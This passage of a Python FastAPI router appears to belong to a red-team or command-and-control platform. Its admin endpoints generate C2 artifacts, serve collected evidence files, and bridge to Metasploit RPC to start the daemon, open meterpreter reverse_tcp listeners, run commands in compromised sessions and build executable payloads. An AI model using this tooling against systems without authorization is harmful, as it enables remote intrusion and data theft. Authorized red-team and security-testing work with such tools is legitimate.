        source_ip=extract_client_ip(request),
        decision="observe",
        risk_score=95,
        signals=["c2_artifact_generated"],
        path=request.url.path,
        method=request.method,
        summary=f"managed artifact generated: {spec.format} {spec.platform} (score=95)",
        timestamp=datetime.now(timezone.utc),
    ))

    return {
        "ok": True,
        "artifact_id": spec.artifact_id,
        "format": spec.format,
        "platform": spec.platform,
        "filename": spec.filename,
        "contentBase64": spec.content if spec.is_binary else None,
        "code": None if spec.is_binary else spec.content,
        "is_binary": spec.is_binary,
        "config": spec.config,
        "description": spec.description,
        "compileLog": spec.compile_log,
    }


@router.get("/api/admin/managed/artifacts/meta")
def api_managed_artifact_meta(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.services.c2_artifact_builder import (
        SUPPORTED_ARTIFACT_ARCHES,
        SUPPORTED_ARTIFACT_FORMATS,
        SUPPORTED_ARTIFACT_PLATFORMS,
    )

    return {
        "formats": list(SUPPORTED_ARTIFACT_FORMATS),
        "platforms": list(SUPPORTED_ARTIFACT_PLATFORMS),
        "arches": list(SUPPORTED_ARTIFACT_ARCHES),
    }


@router.get("/api/admin/managed/evidence")
def api_managed_evidence(request: Request, task_id: int = 0, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.models.managed import ManagedEvidence
    from app.services.managed_runtime import serialize_evidence

    stmt = select(ManagedEvidence).order_by(ManagedEvidence.id.desc()).limit(50)
    if task_id:
        stmt = stmt.where(ManagedEvidence.task_id == task_id)
    return {"evidence": [serialize_evidence(item) for item in db.scalars(stmt).all()]}


@router.get("/api/admin/managed/evidence/{evidence_id}/download")
def api_managed_evidence_download(
    evidence_id: int, request: Request, db: Session = Depends(get_db)
):
    _require_user(request, db)
    import base64 as _b64

    from app.models.managed import ManagedEvidence

    item = db.get(ManagedEvidence, evidence_id)
    if not item:
        raise HTTPException(status_code=404, detail="evidence not found")
    file_b64 = (item.payload_json or {}).get("fileBase64") or ""
    if file_b64:
        filename = (item.payload_json or {}).get("path") or f"evidence_{evidence_id}"
        return Response(
            content=_b64.b64decode(file_b64),
            media_type="application/octet-stream",
            headers={"Content-Disposition": f'attachment; filename="{Path(filename).name}"'},
        )
    return Response(
        content=(item.content_text or "").encode("utf-8"),
        media_type="text/plain; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="evidence_{evidence_id}.txt"'},
    )


# ---------------------------------------------------------------------------
# MSF bridge (degraded without msgpack / metasploit)
# ---------------------------------------------------------------------------


@router.get("/api/admin/msf/status")
def api_msf_status(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.services import msf_runtime

    status = msf_runtime.daemon_status()
    return {
        "available": status.available,
        "daemonRunning": status.daemon_running,
        "connected": status.connected,
        "configured": status.configured,
        "version": status.version,
        "reason": status.reason,
        "payloadPresets": msf_runtime.MSF_PAYLOAD_PRESETS,
        "formats": msf_runtime.MSF_FORMATS,
    }


@router.get("/api/admin/msf/config")
def api_msf_config(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.services import msf_runtime

    return msf_runtime.get_config(masked=True)


@router.put("/api/admin/msf/config")
async def api_msf_config_update(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    body = await request.json()
    cfg = msf_runtime.update_config(
        host=str(body.get("host") or "127.0.0.1"),
        port=int(body.get("port") or 55553),
        username=str(body.get("username") or "msf"),
        password=str(body.get("password") or ""),
        ssl=bool(body.get("ssl", True)),
    )
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="msf",
        target_type="config",
        target_ref="msf_rpc",
    )
    return {"ok": True, "config": cfg}


@router.post("/api/admin/msf/daemon/start")
def api_msf_daemon_start(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    try:
        status = msf_runtime.start_daemon()
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=400)
    log_execution(
        db,
        actor_username=user.username,
        action="daemon-start",
        module="msf",
        target_type="daemon",
        target_ref="msfrpcd",
    )
    return {
        "ok": status.connected,
        "status": {"connected": status.connected, "version": status.version},
    }


@router.post("/api/admin/msf/daemon/stop")
def api_msf_daemon_stop(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    msf_runtime.stop_daemon()
    log_execution(
        db,
        actor_username=user.username,
        action="daemon-stop",
        module="msf",
        target_type="daemon",
        target_ref="msfrpcd",
    )
    return {"ok": True}


@router.get("/api/admin/msf/listeners")
def api_msf_listeners(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.services import msf_runtime

    try:
        rpc = msf_runtime.MsfRpcClient.from_config()
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=503)
    return {"listeners": rpc.list_listeners()}


@router.post("/api/admin/msf/listeners")
async def api_msf_listener_create(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    body = await request.json()
    try:
        rpc = msf_runtime.MsfRpcClient.from_config()
        job_id = rpc.create_listener(
            payload=str(body.get("payload") or "linux/x64/meterpreter/reverse_tcp"),
            lhost=str(body.get("lhost") or "0.0.0.0"),
            lport=int(body.get("lport") or 4444),
        )
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=503)
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="msf",
        target_type="listener",
        target_ref=f"job:{job_id}",
    )
    return {"ok": True, "jobId": job_id}


@router.delete("/api/admin/msf/listeners/{job_id}")
def api_msf_listener_delete(job_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    try:
        msf_runtime.MsfRpcClient.from_config().stop_listener(job_id)
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=503)
    log_execution(
        db,
        actor_username=user.username,
        action="delete",
        module="msf",
        target_type="listener",
        target_ref=f"job:{job_id}",
    )
    return {"ok": True}


@router.get("/api/admin/msf/sessions")
def api_msf_sessions(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    from app.services import msf_runtime

    try:
        rpc = msf_runtime.MsfRpcClient.from_config()
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=503)
    return {"sessions": rpc.list_sessions()}


@router.post("/api/admin/msf/sessions/{session_id}/command")
async def api_msf_session_command(session_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    body = await request.json()
    try:
        output = msf_runtime.MsfRpcClient.from_config().run_session_command(
            session_id, str(body.get("command") or "")
        )
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=503)
    log_execution(
        db,
        actor_username=user.username,
        action="session-exec",
        module="msf",
        target_type="session",
        target_ref=session_id,
    )
    return {"output": output}


@router.delete("/api/admin/msf/sessions/{session_id}")
def api_msf_session_close(session_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    try:
        msf_runtime.MsfRpcClient.from_config().close_session(session_id)
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=503)
    log_execution(
        db,
        actor_username=user.username,
        action="session-close",
        module="msf",
        target_type="session",
        target_ref=session_id,
    )
    return {"ok": True}


@router.post("/api/admin/msf/payloads/generate")
async def api_msf_payload_generate(request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services import msf_runtime

    body = await request.json()
    try:
        artifact = msf_runtime.generate_payload(
            payload=str(body.get("payload") or ""),
            lhost=str(body.get("lhost") or "0.0.0.0"),
            lport=int(body.get("lport") or 4444),
            fmt=str(body.get("format") or "exe"),
        )
    except msf_runtime.MsfRpcError as exc:
        return JSONResponse({"detail": exc.message}, status_code=400)
    log_execution(
        db,
        actor_username=user.username,
        action="generate-payload",
        module="msf",
        target_type="payload",
        target_ref=artifact["filename"],
    )
    return {"ok": True, **artifact}
